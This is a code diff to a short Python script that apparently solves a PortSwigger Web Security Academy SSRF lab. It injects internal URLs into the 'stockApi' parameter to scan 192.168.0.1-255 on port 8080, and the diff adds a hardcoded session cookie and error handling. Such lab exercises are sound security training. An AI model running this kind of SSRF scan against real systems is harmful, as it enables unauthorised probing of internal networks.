@@ -9,11 +9,17 @@ X needs to go from 1 to 255.
 """
 
 url = "https://0a3c00e303e0076d8080211b00340005.web-security-academy.net/product?productId=7"
-
+s = requests.Session()
+# set a cookie on the session
+s.cookies.set("session", "VeIeDw8EwqEnQfEbX3M0LlQzeDGjZ6Fm", domain="0a3c00e303e0076d8080211b00340005.web-security-academy.net", path="/")
 for i in range(1, 256):
-  payload = {"stockApi": ("http%3A%2F%2F192.168.0." + str(i) + ":8080")}
-  response = requests.post(url, json=payload)
-  if response.status_code == 200:
-    print("192.168.0." + str(i) + ":8080")
-    break
-  time.sleep(0.1)
+    try:
+        payload = {"stockApi": ("http%3A%2F%2F192.168.0." + str(i) + ":8080")}
+        response = requests.post(url, json=payload)
+        if response.status_code == 200:
+            print("192.168.0." + str(i) + ":8080")
+            break
+    except:
+        print("connection failure")
+
+print("we failed...")
